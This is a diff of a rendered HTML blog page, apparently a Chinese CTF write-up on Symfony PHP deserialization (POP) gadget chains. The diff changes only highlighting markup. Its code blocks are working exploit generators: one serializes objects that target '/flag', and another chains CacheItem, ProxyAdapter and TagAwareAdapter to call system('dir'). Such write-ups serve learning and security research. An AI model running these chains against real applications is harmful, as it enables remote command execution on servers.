@@ -20,28 +20,29 @@
 &lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203170020908.png" alt="image-20211203170020908">&lt;/p>
 &lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203165959349.png" alt="image-20211203165959349">&lt;/p>
 &lt;p>前两个类都是Symfony\Component\Cache\Adapter命名空间下的，但是CacheItem是Symfony\Component\Cache下的，所以要再引入它，use&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
-&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Symfony\Component\Cache&lt;/span>&lt;span style="color:#111">{&lt;/span>
-&lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">CacheItem&lt;/span>&lt;span style="color:#111">{&lt;/span>
-&lt;span style="color:#111">}&lt;/span>
-&lt;span style="color:#111">}&lt;/span>
-&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Symfony\Component\Cache\Adapter&lt;/span>&lt;span style="color:#111">{&lt;/span>
-&lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">Symfony\Component\Cache\CacheItem&lt;/span>&lt;span style="color:#111">;&lt;/span>
-&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">PhpArrayAdapter&lt;/span>&lt;span style="color:#111">{&lt;/span>
-&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$file&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;/flag&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
-&lt;span style="color:#111">}&lt;/span>
-&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">TagAwareAdapter&lt;/span>&lt;span style="color:#111">{&lt;/span>
-&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$deferred&lt;/span>&lt;span style="color:#111">;&lt;/span>
-&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$pool&lt;/span>&lt;span style="color:#111">;&lt;/span>
-&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
-&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">deferred&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;amiz&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">CacheItem&lt;/span>&lt;span style="color:#111">());&lt;/span>
-&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">pool&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">PhpArrayAdapter&lt;/span>&lt;span style="color:#111">();&lt;/span>
-&lt;span style="color:#111">}&lt;/span>
-&lt;span style="color:#111">}&lt;/span>
-&lt;span style="color:#111">$a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">TagAwareAdapter&lt;/span>&lt;span style="color:#111">();&lt;/span>
-&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">urlencode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#111">));&lt;/span>
-&lt;span style="color:#111">}&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="链子2---rce">链子2 - rce&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Symfony\Component\Cache&lt;/span>&lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">CacheItem&lt;/span>&lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Symfony\Component\Cache\Adapter&lt;/span>&lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">Symfony\Component\Cache\CacheItem&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">PhpArrayAdapter&lt;/span>&lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$file&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;/flag&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">TagAwareAdapter&lt;/span>&lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$deferred&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$pool&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">deferred&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;amiz&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">CacheItem&lt;/span>&lt;span style="color:#111">());&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">pool&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">PhpArrayAdapter&lt;/span>&lt;span style="color:#111">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">TagAwareAdapter&lt;/span>&lt;span style="color:#111">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">urlencode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#111">));&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="链子2---rce">链子2 - rce&lt;/h2>
 &lt;p>回到前面在相同命名空间下找&lt;code>saveDeferred()&lt;/code>的地方，还有另一个类也有同样的方法 vendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/ProxyAdapter.php&lt;/p>
 &lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204102722908.png" alt="image-20211204102722908">&lt;/p>
 &lt;p>跟进&lt;code>doSave()&lt;/code>&lt;/p>
@@ -54,50 +55,53 @@
 &lt;p>光看这个判断肥肠的突兀，还要结合207行的&lt;code>$item = (array) $item;&lt;/code>，它将一个类强行转换成数组，而后面跟着的这个if判断就是为了解决类中原有的 &lt;em>protected&lt;/em>的属性冲突，所以需要在相同的命名空间里接着找一个类，包含&lt;code>pollHash&lt;/code>和&lt;code>innerItem&lt;/code>属性，最终还是找到了CacheItem（前面也是它&lt;/p>
 &lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204104546506.png" alt="image-20211204104546506">&lt;/p>
 &lt;p>构造exp&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
-&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Symfony\Component\Cache&lt;/span>&lt;span style="color:#111">{&lt;/span>
-&lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">CacheItem&lt;/span>
-&lt;span style="color:#111">{&lt;/span>
-&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$expiry&lt;/span>&lt;span style="color:#111">;&lt;/span>
-&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$poolHash&lt;/span>&lt;span style="color:#111">;&lt;/span>
-&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$innerItem&lt;/span>&lt;span style="color:#111">;&lt;/span>
-&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$expiry&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$poolHash&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$command&lt;/span>&lt;span style="color:#111">)&lt;/span>
-&lt;span style="color:#111">{&lt;/span>
-&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">expiry&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$expiry&lt;/span>&lt;span style="color:#111">;&lt;/span>
-&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">poolHash&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$poolHash&lt;/span>&lt;span style="color:#111">;&lt;/span>
-&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">innerItem&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$command&lt;/span>&lt;span style="color:#111">;&lt;/span>
-&lt;span style="color:#111">}&lt;/span>
-&lt;span style="color:#111">}&lt;/span>
-&lt;span style="color:#111">}&lt;/span>
-&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Symfony\Component\Cache\Adapter&lt;/span>&lt;span style="color:#111">{&lt;/span>
-&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">ProxyAdapter&lt;/span>
-&lt;span style="color:#111">{&lt;/span>
-&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$poolHash&lt;/span>&lt;span style="color:#111">;&lt;/span>
-&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$setInnerItem&lt;/span>&lt;span style="color:#111">;&lt;/span>
-&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$poolHash&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$func&lt;/span>&lt;span style="color:#111">)&lt;/span>
-&lt;span style="color:#111">{&lt;/span>
-&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">poolHash&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$poolHash&lt;/span>&lt;span style="color:#111">;&lt;/span>
-&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">setInnerItem&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$func&lt;/span>&lt;span style="color:#111">;&lt;/span>
-&lt;span style="color:#111">}&lt;/span>
-&lt;span style="color:#111">}&lt;/span>
-&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">TagAwareAdapter&lt;/span>
-&lt;span style="color:#111">{&lt;/span>
-&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$deferred&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[];&lt;/span>
-&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$pool&lt;/span>&lt;span style="color:#111">;&lt;/span>
-&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$deferred&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$pool&lt;/span>&lt;span style="color:#111">)&lt;/span>
-&lt;span style="color:#111">{&lt;/span>
-&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">deferred&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$deferred&lt;/span>&lt;span style="color:#111">;&lt;/span>
-&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">pool&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$pool&lt;/span>&lt;span style="color:#111">;&lt;/span>
-&lt;span style="color:#111">}&lt;/span>
-&lt;span style="color:#111">}&lt;/span>
-&lt;span style="color:#111">}&lt;/span>
-&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#111">{&lt;/span>
-&lt;span style="color:#111">$cacheitem&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Symfony\Component\Cache\CacheItem&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;dir&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
-&lt;span style="color:#111">$proxyadapter&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Symfony\Component\Cache\Adapter\ProxyAdapter&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;system&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
-&lt;span style="color:#111">$tagawareadapter&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Symfony\Component\Cache\Adapter\TagAwareAdapter&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$cacheitem&lt;/span>&lt;span style="color:#111">),&lt;/span>&lt;span style="color:#111">$proxyadapter&lt;/span>&lt;span style="color:#111">);&lt;/span>
-&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">urlencode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$tagawareadapter&lt;/span>&lt;span style="color:#111">));&lt;/span>
-&lt;span style="color:#111">}&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>本地尝试一下（懒得再开靶机了w&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Symfony\Component\Cache&lt;/span>&lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">CacheItem&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$expiry&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$poolHash&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$innerItem&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$expiry&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$poolHash&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$command&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">expiry&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$expiry&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">poolHash&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$poolHash&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">innerItem&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$command&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Symfony\Component\Cache\Adapter&lt;/span>&lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">ProxyAdapter&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$poolHash&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$setInnerItem&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$poolHash&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$func&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">poolHash&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$poolHash&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">setInnerItem&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$func&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">TagAwareAdapter&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$deferred&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[];&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$pool&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$deferred&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$pool&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">deferred&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$deferred&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">pool&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$pool&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$cacheitem&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Symfony\Component\Cache\CacheItem&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;dir&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$proxyadapter&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Symfony\Component\Cache\Adapter\ProxyAdapter&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;system&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$tagawareadapter&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Symfony\Component\Cache\Adapter\TagAwareAdapter&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$cacheitem&lt;/span>&lt;span style="color:#111">),&lt;/span>&lt;span style="color:#111">$proxyadapter&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">urlencode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$tagawareadapter&lt;/span>&lt;span style="color:#111">));&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>本地尝试一下（懒得再开靶机了w&lt;/p>
 &lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204104738527.png" alt="image-20211204104738527">&lt;/p>
 &lt;p>成功了捏&lt;/p>
 &lt;h2 id="链子3---rce">链子3 - rce&lt;/h2>
@@ -124,68 +128,68 @@
